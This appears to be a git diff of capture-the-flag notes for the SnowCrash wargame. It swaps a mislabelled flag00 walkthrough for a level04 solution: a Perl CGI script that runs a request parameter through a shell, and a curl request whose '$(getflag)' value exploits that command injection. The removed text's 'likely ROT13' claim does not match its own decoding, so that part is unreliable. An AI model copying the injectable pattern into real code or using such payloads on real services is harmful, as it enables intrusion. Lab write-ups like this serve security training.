@@ -1,40 +1,16 @@
-# Resources for level04
+level04@SnowCrash:~$ cat level04.pl 
+#!/usr/bin/perl
+# localhost:4747
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+sub x {
+  $y = $_[0];
+  print `echo $y 2>&1`;
+}
+x(param("x"));
 
-## Walkthrough to capture the flag:
 
-### Step 1: Find files owned by user `flag00`
-```bash
-find / -user flag00 2>/dev/null
-```
-> Output:
-```
-/usr/sbin/john
-/rofs/usr/sbin/john
-```
+level04@SnowCrash:~$ curl  'localhost:4747/?x=$(getflag)'
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
 
-### Step 2: Read the encrypted string
-```bash
-cat /rofs/usr/sbin/john
-```
-> Output:
-```
-cdiiddwpgswtgt
-```
-
-### Step 3: Decrypt it (likely ROT13)
-Decrypted password: `nottoohardhere`
-
-### Step 4: Switch to `flag00` user
-```bash
-su flag00
-# enter password: nottoohardhere
-```
-
-### Step 5: Get the flag
-```bash
-getflag
-```
-> Output:
-```
-Check flag.Here is your token : x24ti5gi3x0ol2eh4esiuxias
-```
+there is a differance between ''    ""   in curl 
